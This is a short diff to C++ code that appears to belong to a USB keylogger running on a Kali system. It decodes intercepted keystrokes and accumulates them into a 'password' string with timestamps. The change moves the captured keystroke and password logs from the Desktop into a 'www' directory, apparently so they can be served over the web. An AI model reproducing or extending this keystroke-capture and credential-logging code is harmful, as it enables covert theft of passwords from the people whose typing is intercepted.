@@ -325,8 +325,8 @@ void getData(struct usb_raw_transfer_io io, __u8 bEndpointAddress,
     }
 
     // Write the letters to a file
-    writeLettersToFile("/home/kali/Desktop/output.txt", asciiLetters);
-    writeLettersToFile("/home/kali/Desktop/output2.txt",
+    writeLettersToFile("/home/kali/www/output.txt", asciiLetters);
+    writeLettersToFile("/home/kali/www/output2.txt",
                        timestamp + " " + asciiLetters + "\r\n");
     return;
   }
@@ -347,7 +347,7 @@ void getData(struct usb_raw_transfer_io io, __u8 bEndpointAddress,
     if (asciiLetters != "[windows]") {
       password += asciiLetters;
       std::cout << "[*] Password: " << password << std::endl;
-      writeLettersToFile("/home/kali/Desktop/password.txt",
+      writeLettersToFile("/home/kali/www/password.txt",
                          timestamp + " " + password + "\r\n");
     }
 
